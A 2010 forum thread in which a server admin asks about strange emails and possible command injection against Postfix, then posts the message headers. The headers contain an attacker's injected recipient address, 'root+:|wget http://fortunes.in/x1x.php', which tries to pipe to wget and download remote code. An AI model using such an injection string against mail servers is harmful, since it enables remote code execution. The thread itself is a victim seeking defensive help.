---
title: "Postfix injections?"
date: 2010-04-14
forum: Server Platforms
---

### Post by blakeoxx on 2010-04-14
I am running Postfix and some Courier services to send and receive email on my Ubuntu server. Lately, I've been getting these strange emails which at first I thought were just spam. I googled some parts of one I got today and found out it could mean I'm being attacked using a technique apparently called Arbitrary IMAP/SMTP Command Injection. After a while of searching, I was not able to find any way to prevent future attacks or even confirm that I am vulnerable.

Can anyone offer some advice?

---

### Post by KB1JWQ on 2010-04-15
Sure!

I'd advise you to post the output of postconf -n, some headers and log snippets that cause you to suspect you've had an injection, and maybe something past "I did some googling and found the following ill defined suggestion" as a problem report.

---

### Post by blakeoxx on 2010-04-16
I have my email set up to forward to my Gmail. The following is the email that makes me suspect Im under attack.

> Delivered-To: ***@gmail.com
Received: by 10.239.183.201 with SMTP id v9cs207801hbg;
        Wed, 14 Apr 2010 19:49:01 -0700 (PDT)
Received: by 10.213.50.84 with SMTP id y20mr4371464ebf.74.1271299741314;
        Wed, 14 Apr 2010 19:49:01 -0700 (PDT)
Received-SPF: softfail (google.com: best guess record for domain of transitioning [email]blue@****.com[/email] does not designate 67.228.215.194 as permitted sender) client-ip=67.228.215.194;
Message-ID: <4bc67e9c.1467f10a.4d7c.0753MFETCHER_ADDED@google.com>
Received: by 10.241.103.20 with POP3 id 20mf116356ewy.29;
        Wed, 14 Apr 2010 19:49:00 -0700 (PDT)
X-Gmail-Fetch-Info: ***@***.com 5 mail.***.com 110 blake
Return-Path: <blue@****.com>
X-Original-To: "root+:|wget http://fortunes.in/x1x.php"
Delivered-To: ***@***.com
Received: from bluedick (unknown [67.228.215.194])
	by mail.***.com (Postfix) with SMTP id D638C28221
	for <"root+:|wget http://fortunes.in/x1x.php">; Wed, 14 Apr 2010 21:40:08 -0500 (CDT)

The 'for <"root+:|wget http://fortunes.in/x1x.php">;' is what I Googled around for, which led me to an article about the attack. Any better? Sorry, I just have no clue where to start with this...

---

